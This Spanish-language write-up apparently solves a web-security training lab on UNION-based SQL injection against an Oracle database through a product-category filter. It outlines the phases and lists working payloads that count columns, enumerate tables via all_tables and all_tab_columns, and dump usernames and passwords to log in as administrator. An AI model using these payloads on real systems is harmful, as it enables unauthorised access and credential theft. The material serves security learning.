La vulnerabilidad se encuentra en el parámetro de categoría del filtro de productos, y la respuesta de la aplicación muestra los resultados de la consulta, lo que permite visualizar directamente los datos inyectados.

El objetivo es encontrar y consultar una tabla interna que almacena nombres de usuario y contraseñas. El proceso se desarrolla en varias fases:

- Identificar el número de columnas y las que permiten mostrar texto en la respuesta, utilizando un payload simple como prueba.
- Listar todas las tablas disponibles usando la vista ‘**all_tables**‘, propia de Oracle.
- Localizar la tabla de usuarios, observando los resultados devueltos por la consulta inyectada.
- Consultar ‘**all_tab_columns**‘ para descubrir los nombres de las columnas de esa tabla.
- Obtener los valores de usuario y contraseña realizando una consulta directa sobre la tabla objetivo.

Una vez localizada la contraseña del administrador, basta con iniciar sesión para resolver el laboratorio.

**Quédate con esto**: Aunque el sistema sea Oracle, los fundamentos de la inyección SQL siguen siendo aplicables. Lo importante es conocer las vistas internas adecuadas para cada motor de base de datos.

-----

* Primero debemos de buscar el total de columnas existentes que nos muestra la Web
    + '  (para provocar un error en la consultar de Oracle)
    + ' order by 2-- -
    + ' union select 1,2-- -
    + ' union select NULL, NULL-- -
    + ' union select 'test','test2' from dual-- -
    + ' union select NULL,table_name from all_tables-- - (todas las tablas de todas las bases de datos existentes)
    + ' union select NULL,column_name from all_tab_columns where table_name='TABLE'-- - (todas las columnas de la tabla dada)
    + ' union select username,password from TABLE-- - (minar los datos de la tabla y columnas dadas)


